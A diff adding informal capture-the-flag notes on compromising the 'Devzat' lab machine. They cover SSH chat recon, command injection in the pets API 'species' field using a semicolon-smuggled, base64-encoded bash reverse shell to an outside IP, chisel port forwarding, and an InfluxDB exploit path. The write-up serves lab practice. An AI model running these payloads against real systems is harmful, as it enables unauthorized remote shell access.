@@ -1,0 +1,91 @@
+i added the hostname to the /etc/hosts dir per the nmap scan.
+
+it looks like there's a ssh chat app open to all users - not sure if this will lead to anything
+
+at the bottom there was an email that listed patrick@devzat.htb.  So I tried logging in with his username to the chat app and got this:
+
+ssh -l patrick devzat.htb -p 8000
+Nickname reserved for local use, please choose a different one.
+> Patrick
+admin: Hey patrick, you there?
+patrick: Sure, shoot boss!
+admin: So I setup the influxdb for you as we discussed earlier in business meeting.
+patrick: Cool 👍
+admin: Be sure to check it out and see if it works for you, will ya?
+patrick: Yes, sure. Am on it!
+devbot: admin has left the chat
+Welcome to the chat. There are no more users
+devbot: Patrick has joined the chat
+
+
+a note on the site indicated that this is a for of the Devzat project, combining that with the Patrick user from the site, I found this:
+
+https://github.com/patrickhener/sschat/
+From this link,
+
+the main func contains this code:
+package main
+
+import (
+	"github.com/patrickhener/sschat/sschat"
+)
+
+func main() {
+	port := 8000
+	ip := "127.0.0.1"
+	sshkey := "/home/patrick/.ssh/id_rsa"
+
+	chat := sschat.Server{
+		Port:   port,
+		IP:     ip,
+		SSHKey: sshkey,
+	}
+
+	chat.Run()
+}
+
+
+------------------
+
+if you navigate to the pets subdomain, for some reason if you pass:
+<h1>test<h1> you get this output
+<h1>test</h1> 		exit status 1
+
+
+Okay so, after testing you can see that the site takes two params sent via JSON, the name field just errors out, but if you send a payload like the below:
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNS85MDAxIDA+JjEK | base64 -d | bash
+
+
+within the species field, like the below request, you get a rev shell
+
+
+POST /api/pet HTTP/1.1
+Host: pets.devzat.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://pets.devzat.htb/
+Content-Type: text/plain;charset=UTF-8
+Origin: http://pets.devzat.htb
+Content-Length: 113
+Connection: close
+
+{"name":"test",
+"species":";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41OC85MDAxIDA+JjEK | base64 -d | bash"
+}
+
+Then for user you can kinda combine two things, one was the information we found earlier via the ssh app, by logging in as Patrick and seeing mention of a Influxdb install + `ss -lntp` showing ports on 8086 (can't remember the exact port but Influxdb uses that and I think 8088)
+
+I then used chisel to send that port back, something like the below
+
+./chisel server -p 8000 --reverse
+./chisel client 10.10.16.35:8000 R:9003:127.0.0.1:8086
+
+Then I used a combination of a CVE found via Github and the below article (for the cmds)
+
+https://book.hacktricks.xyz/pentesting/8086-pentesting-influxdb
+
+which eventually led to user
+
+
